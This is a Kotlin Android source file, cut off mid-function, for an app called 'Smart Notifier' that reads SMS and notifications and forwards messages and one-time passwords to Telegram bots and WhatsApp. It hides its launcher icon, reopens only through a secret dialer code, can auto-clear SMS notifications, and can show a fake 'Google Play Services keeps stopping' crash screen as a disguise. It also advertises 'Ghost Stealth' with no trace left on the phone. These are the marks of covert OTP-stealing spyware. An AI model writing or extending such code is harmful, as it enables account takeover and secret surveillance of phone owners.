package com.example.otpforwarder

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.KeyguardManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.launch

// MNC-Grade Obsidian Color Palette (Linear / Stripe Inspired)
val DarkBg = Color(0xFF090D16)
val CardBg = Color(0xFF111827)
val CardBorder = Color(0xFF1F2937)
val AccentEmerald = Color(0xFF10B981)
val AccentIndigo = Color(0xFF6366F1)
val AccentAmber = Color(0xFFF59E0B)
val TextPrimary = Color(0xFFF9FAFB)
val TextSecondary = Color(0xFF9CA3AF)
val TextMuted = Color(0xFF6B7280)

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val smsGranted = permissions[Manifest.permission.RECEIVE_SMS] ?: false
        if (smsGranted) {
            Toast.makeText(this, "✅ Permissions Granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAppPermissions()

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBg
                ) {
                    RootAppScreen(
                        onOpenNotificationSettings = {
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            startActivity(intent)
                        },
                        onRequestPermissions = { requestAppPermissions() },
                        onExitApp = { finish() }
                    )
                }
            }
        }
    }

    private fun requestAppPermissions() {
        val perms = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        val needed = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            permissionLauncher.launch(needed.toTypedArray())
        }
    }
}

fun checkNotificationAccess(context: Context): Boolean {
    val pkgName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat != null && flat.contains(pkgName)
}

fun isIgnoringBatteryOptimizations(context: Context): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }
    return true
}

fun isLauncherIconHidden(context: Context): Boolean {
    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
    val state = context.packageManager.getComponentEnabledSetting(alias)
    return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
}

fun setLauncherIconVisibility(context: Context, hide: Boolean) {
    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
    val newState = if (hide) {
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } else {
        PackageManager.COMPONENT_ENABLED_STATE_ENABLED
    }
    context.packageManager.setComponentEnabledSetting(
        alias,
        newState,
        PackageManager.DONT_KILL_APP
    )
}

@Composable
fun RootAppScreen(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit,
    onExitApp: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }

    val isFakeCrashEnabled = remember { prefs.getBoolean("fake_crash_enabled", false) }
    var isFakeCrashPassed by remember { mutableStateOf(!isFakeCrashEnabled) }

    val isAppLockEnabled = remember { prefs.getBoolean("app_lock_enabled", false) }
    var isAppUnlocked by remember { mutableStateOf(!isAppLockEnabled) }

    if (!isFakeCrashPassed) {
        FakeCrashScreen(
            onUnlock = { isFakeCrashPassed = true },
            onExit = onExitApp
        )
    } else if (!isAppUnlocked) {
        AppLockScreen(
            onUnlockSuccess = { isAppUnlocked = true },
            onExit = onExitApp
        )
    } else {
        MainScreenContent(
            onOpenNotificationSettings = onOpenNotificationSettings,
            onRequestPermissions = onRequestPermissions
        )
    }
}

@Composable
fun FakeCrashScreen(onUnlock: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    var tapCount by remember { mutableStateOf(0) }
    var lastTapTime by remember { mutableStateOf(0L) }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF0F172A))
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
            shape = RoundedCornerShape(20.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Secret tap icon (3 taps within 1.5s bypasses the disguise)
                Box(
                    modifier = Modifier
                        .size(64.dp)
                        .clip(CircleShape)
                        .background(Color(0xFF334155))
                        .clickable {
                            val now = System.currentTimeMillis()
                            if (now - lastTapTime < 1500) {
                                tapCount++
                            } else {
                                tapCount = 1
                            }
                            lastTapTime = now
                            if (tapCount >= 3) {
                                Toast.makeText(context, "🔓 Disguise Bypassed", Toast.LENGTH_SHORT).show()
                                onUnlock()
                            }
                        },
                    contentAlignment = Alignment.Center
                ) {
                    Text("⚠️", fontSize = 36.sp)
                }

                Spacer(modifier = Modifier.height(16.dp))

                Text(
                    text = "Google Play Services keeps stopping",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(10.dp))

                Text(
                    text = "com.google.android.gms has encountered an unexpected background error and had to close.",
                    fontSize = 12.sp,
                    color = TextSecondary,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = onExit,
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Close app", color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                }

                Spacer(modifier = Modifier.height(10.dp))

                OutlinedButton(
                    onClick = onExit,
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Send feedback", color = TextSecondary, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun AppLockScreen(onUnlockSuccess: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    val keyguardManager = remember { context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager }

    val authLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            Toast.makeText(context, "✅ Identity Verified", Toast.LENGTH_SHORT).show()
            onUnlockSuccess()
        } else {
            Toast.makeText(context, "❌ Authentication Failed / Cancelled", Toast.LENGTH_SHORT).show()
        }
    }

    val launchAuth = {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val intent = keyguardManager?.createConfirmDeviceCredentialIntent(
                "Smart Notifier Security",
                "Enter phone Fingerprint, PIN, or Pattern to access"
            )
            if (intent != null) {
                authLauncher.launch(intent)
            } else {
                onUnlockSuccess()
            }
        } else {
            onUnlockSuccess()
        }
    }

    LaunchedEffect(Unit) {
        launchAuth()
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(DarkBg)
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CardBg),
            border = BorderStroke(1.dp, CardBorder),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(28.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text("🔒", fontSize = 48.sp)
                Spacer(modifier = Modifier.height(14.dp))
                Text(
                    text = "App Lock Active",
                    fontSize = 19.sp,
                    fontWeight = FontWeight.Bold,
                    color = TextPrimary
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Phone Fingerprint ya PIN verify karke open karein.",
                    fontSize = 13.sp,
                    color = TextSecondary,
                    textAlign = TextAlign.Center
                )
                Spacer(modifier = Modifier.height(24.dp))
                Button(
                    onClick = { launchAuth() },
                    modifier = Modifier.fillMaxWidth().height(48.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
                ) {
                    Text("🔓 Unlock Now (Biometric / PIN)", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                }
                Spacer(modifier = Modifier.height(10.dp))
                OutlinedButton(
                    onClick = onExit,
                    shape = RoundedCornerShape(12.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth().height(48.dp)
                ) {
                    Text("Exit", color = TextSecondary, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun MainScreenContent(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()

    var selectedTab by remember { mutableStateOf(0) }
    var isMasterEnabled by remember { mutableStateOf(prefs.getBoolean("is_enabled", true)) }
    var hasNotificationAccess by remember { mutableStateOf(checkNotificationAccess(context)) }
    var hasBatteryExemption by remember { mutableStateOf(isIgnoringBatteryOptimizations(context)) }
    var showAdminDialog by remember { mutableStateOf(false) }
    var showHelpDialog by remember { mutableStateOf(false) }

    // Cloudflare Session Verification & Trial Check
    LaunchedEffect(Unit) {
        hasNotificationAccess = checkNotificationAccess(context)
        hasBatteryExemption = isIgnoringBatteryOptimizations(context)

        if (!CloudflareLicenseManager.isMasterFounder(context)) {
            val sessionRes = CloudflareLicenseManager.verifySession(context)
            if (sessionRes.second) { // Auto-logged out!
                Toast.makeText(context, "⚠️ ${sessionRes.third}", Toast.LENGTH_LONG).show()
            } else {
                CloudflareLicenseManager.checkOrStartTrial(context)
            }
        }
    }

    Column(modifier = Modifier.fillMaxSize().background(DarkBg)) {
        // MNC Header Bar
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = CardBg,
            border = BorderStroke(1.dp, CardBorder)
        ) {
            Column(modifier = Modifier.padding(horizontal = 16.dp, vertical = 14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = "Smart Notifier",
                                fontSize = 19.sp,
                                fontWeight = FontWeight.ExtraBold,
                                color = TextPrimary
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            // Enterprise Admin Trigger Chip
                            Surface(
                                shape = RoundedCornerShape(16.dp),
                                color = Color(0xFF1E1B4B),
                                border = BorderStroke(1.dp, Color(0xFF4338CA)),
                                modifier = Modifier.clickable { showAdminDialog = true }
                            ) {
                                Text(
                                    text = if (CloudflareLicenseManager.isMasterFounder(context)) "👑 FOUNDER" else "⚡ ENTERPRISE",
                                    fontSize = 9.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = if (CloudflareLicenseManager.isMasterFounder(context)) Color(0xFFFBBF24) else Color(0xFFA5B4FC),
                                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp)
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(2.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier
                                    .size(7.dp)
                                    .clip(CircleShape)
                                    .background(if (isMasterEnabled) AccentEmerald else Color(0xFFEF4444))
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = if (isMasterEnabled) "Ghost Stealth Active · 0.2s Delivery" else "Engine Paused",
                                fontSize = 11.sp,
                                color = if (isMasterEnabled) AccentEmerald else Color(0xFFEF4444),
                                fontWeight = FontWeight.Medium
                            )
                        }
                    }

                    Switch(
                        checked = isMasterEnabled,
                        onCheckedChange = { checked ->
                            isMasterEnabled = checked
                            prefs.edit().putBoolean("is_enabled", checked).apply()
                        },
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = Color.White,
                            checkedTrackColor = AccentEmerald,
                            uncheckedThumbColor = Color.Gray,
                            uncheckedTrackColor = Color(0xFF1E293B)
                        )
                    )
                }

                // Notification Permission Warning
                if (!hasNotificationAccess) {
                    Card(
                        modifier = Modifier.fillMaxWidth().padding(top = 10.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF422006)),
                        border = BorderStroke(1.dp, Color(0xFF854D0E)),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth().padding(10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Text(
                                text = "⚡ Notification Access Required",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFFFDE047),
                                modifier = Modifier.weight(1f)
                            )
                            Button(
                                onClick = onOpenNotificationSettings,
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEAB308)),
                                shape = RoundedCornerShape(8.dp),
                                contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
                            ) {
                                Text("Grant", fontSize = 11.sp, color = Color.Black, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }

                // Battery Whitelist Warning
                if (!hasBatteryExemption) {
                    Card(
                        modifier = Modifier.fillMaxWidth().padding(top = 8.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF064E3B)),
                        border = BorderStroke(1.dp, Color(0xFF047857)),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth().padding(10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    text = "🔋 24/7 Deep Sleep Protection",
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF6EE7B7)
                                )
                                Text(
                                    text = "Phone ko app sleep karne se rokein",
                                    fontSize = 10.sp,
                                    color = Color(0xFFA7F3D0)
                                )
                            }
                            Button(
                                onClick = {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                            data = Uri.parse("package:${context.packageName}")
                                        }
                                        try {
                                            context.startActivity(intent)
                                        } catch (e: Exception) {
                                            val fallback = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                                            context.startActivity(fallback)
                                        }
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = AccentEmerald),
                                shape = RoundedCornerShape(8.dp),
                                contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
                            ) {
                                Text("Whitelist", fontSize = 11.sp, color = Color.Black, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }
            }
        }

        // Floating Segmented Capsule Navigation
        Surface(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 16.dp, vertical = 10.dp),
            shape = RoundedCornerShape(32.dp),
            color = Color(0xFF111827),
            border = BorderStroke(1.dp, CardBorder)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(4.dp),
                horizontalArrangement = Arrangement.SpaceEvenly
            ) {
                NavPill("⚡ Channels", selected = selectedTab == 0) { selectedTab = 0 }
                NavPill("🎯 Rules", selected = selectedTab == 1) { selectedTab = 1 }
                NavPill("📜 History", selected = selectedTab == 2) { selectedTab = 2 }
                NavPill("👑 Pro & PayTM", selected = selectedTab == 3) { selectedTab = 3 }
            }
        }

        // Tab Body
        Box(modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp)) {
            when (selectedTab) {
                0 -> ServicesTab(context, onOpenHelp = { showHelpDialog = true })
                1 -> KeywordsTab(context)
                2 -> HistoryTab(context)
                3 -> ProPaytmTab(context)
            }
        }
    }

    // Master Admin Dialog
    if (showAdminDialog) {
        AdminEnterpriseDialog(
            context = context,
            onDismiss = { showAdminDialog = false }
        )
    }

    // In-App Quick Setup Guide Modal
    if (showHelpDialog) {
        QuickSetupGuideDialog(
            context = context,
            onDismiss = { showHelpDialog = false }
        )
    }
}

@Composable
fun RowScope.NavPill(text: String, selected: Boolean, onClick: () -> Unit) {
    Surface(
        modifier = Modifier
            .weight(1f)
            .height(38.dp)
            .clip(RoundedCornerShape(24.dp))
            .clickable { onClick() },
        color = if (selected) AccentIndigo else Color.Transparent,
        shape = RoundedCornerShape(24.dp)
    ) {
        Box(contentAlignment = Alignment.Center) {
            Text(
                text = text,
                fontSize = 12.sp,
                fontWeight = if (selected) FontWeight.Bold else FontWeight.Medium,
                color = if (selected) Color.White else TextSecondary
            )
        }
    }
}

@Composable
fun ServicesTab(
    context: Context,
    onOpenHelp: () -> Unit
) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()

    // 1. Telegram 1 State
    var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
    var botToken by remember { mutableStateOf(prefs.getString("bot_token", TelegramHelper.DEFAULT_BOT_TOKEN) ?: "") }
    var chatId by remember { mutableStateOf(prefs.getString("chat_id", TelegramHelper.DEFAULT_CHANNEL_ID) ?: "") }
    var telegramStatus by remember { mutableStateOf("") }

    // 2. Telegram 2 State
    var isTelegram2Enabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_2_enabled", false)) }
    var botToken2 by remember { mutableStateOf(prefs.getString("bot_token_2", "") ?: "") }
    var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
    var telegram2Status by remember { mutableStateOf("") }

    // 3. WhatsApp State (CallMeBot Ghost Gateway)
    var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
    var waPhone by remember { mutableStateOf(prefs.getString("wa_phone", "") ?: "") }
    var waApiKey by remember { mutableStateOf(prefs.getString("wa_api_key", "") ?: "") }
    var waStatus by remember { mutableStateOf("") }

    // 4. Pro Features
    var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
    var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }

    // 5. Custom Secret Code & Security State
    var customSecretCode by remember { mutableStateOf(prefs.getString("custom_secret_code", "0825") ?: "0825") }
    var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
    var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
    var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
    var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
    var isAutoClearSms by remember { mutableStateOf(prefs.getBoolean("auto_clear_sms_notification", false)) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Quick Help Guide Banner
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("❓ Kaise Use Karein? (Setup Guide)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
                    Text("Telegram Bot aur WhatsApp jodne ka 1 minute ka simple guide", fontSize = 11.sp, color = TextSecondary)
                }
                Button(
                    onClick = onOpenHelp,
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(8.dp),
                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Text("Guide", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Only OTP Mode
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Only OTP Mode (1-Tap Copy)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF67E8F9))
                    Text("Dost ko message ki jagah sirf 6-digit OTP code bhejega", fontSize = 11.sp, color = TextSecondary)
                }
                Switch(
                    checked = isOnlyOtpMode,
                    onCheckedChange = { checked ->
                        isOnlyOtpMode = checked
                        prefs.edit().putBoolean("only_otp_mode", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Low Battery Alert
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🔋 Low Battery Telegram Alert", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = AccentAmber)
                    Text("Phone battery 15% hote hi Telegram par alert aayega", fontSize = 11.sp, color = TextSecondary)
                }
                Switch(
                    checked = isLowBatteryAlertEnabled,
                    onCheckedChange = { checked ->
                        isLowBatteryAlertEnabled = checked
                        prefs.edit().putBoolean("low_battery_alert_enabled", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Telegram 1 (Primary)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentEmerald)
                        Text("100% Ghost Stealth (Phone me koi trace nahi)", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isTelegramEnabled,
                        onCheckedChange = { isTelegramEnabled = it }
                    )
                }

                if (isTelegramEnabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = "Bot Token 1")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = "Channel / Chat ID 1 (e.g. -100...)")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegramStatus = "Testing Telegram 1..."
                            scope.launch {
                                val res = TelegramHelper.sendMessage(
                                    botToken.trim(),
                                    chatId.trim(),
                                    "🎉 Smart Notifier: Telegram 1 connection verified successfully!"
                                )
                                telegramStatus = if (res.first) "✅ Telegram 1 Connected!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF047857)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 1", fontSize = 13.sp)
                    }
                    if (telegramStatus.isNotEmpty()) {
                        Text(
                            text = telegramStatus,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegramStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Telegram 2 (Secondary)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 2 (2nd Account / Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF34D399))
                        Text("Dusre bot ya backup channel ke liye", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isTelegram2Enabled,
                        onCheckedChange = { isTelegram2Enabled = it }
                    )
                }

                if (isTelegram2Enabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = botToken2, onValueChange = { botToken2 = it }, label = "Bot Token 2")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = chatId2, onValueChange = { chatId2 = it }, label = "Channel / Chat ID 2")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegram2Status = "Testing Telegram 2..."
                            scope.launch {
                                val token = if (botToken2.trim().isNotEmpty()) botToken2.trim() else botToken.trim()
                                val res = TelegramHelper.sendMessage(
                                    token,
                                    chatId2.trim(),
                                    "🎉 Smart Notifier: Telegram 2 connection verified!"
                                )
                                telegram2Status = if (res.first) "✅ Telegram 2 Connected!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 2", fontSize = 13.sp)
                    }
                    if (telegram2Status.isNotEmpty()) {
                        Text(
                            text = telegram2Status,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegram2Status.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: WhatsApp Forwarding (CallMeBot Ghost Gateway)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF2DD4BF))
                        Text("CallMeBot Cloud Gateway (Phone me koi chat record nahi)", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isWhatsAppEnabled,
                        onCheckedChange = { isWhatsAppEnabled = it }
                    )
                }

                if (isWhatsAppEnabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = waPhone, onValueChange = { waPhone = it }, label = "WhatsApp Mobile No. (e.g. 919876543210)")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = waApiKey, onValueChange = { waApiKey = it }, label = "CallMeBot API Key")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            waStatus = "Testing WhatsApp..."
                            scope.launch {
                                val res = WhatsAppHelper.sendMessage(waPhone.trim(), waApiKey.trim(), "🎉 Smart Notifier: WhatsApp delivery test successful!")
                                waStatus = if (res.first) "✅ WhatsApp Test Sent!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F766E)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test WhatsApp", fontSize = 13.sp)
                    }
                    if (waStatus.isNotEmpty()) {
                        Text(
                            text = waStatus,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (waStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Stealth & Security Controls
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
                Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
                Spacer(modifier = Modifier.height(12.dp))

                // Custom Secret Dialer Setting
                Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 10.sp, color = TextMuted)
                Spacer(modifier = Modifier.height(6.dp))
                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.weight(1f)) {
                        MncTextField(
                            value = customSecretCode,
                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
                            label = "Custom Code (e.g. 1234)"
                        )
                    }
                    Spacer(modifier = Modifier.width(8.dp))
                    Button(
                        onClick = {
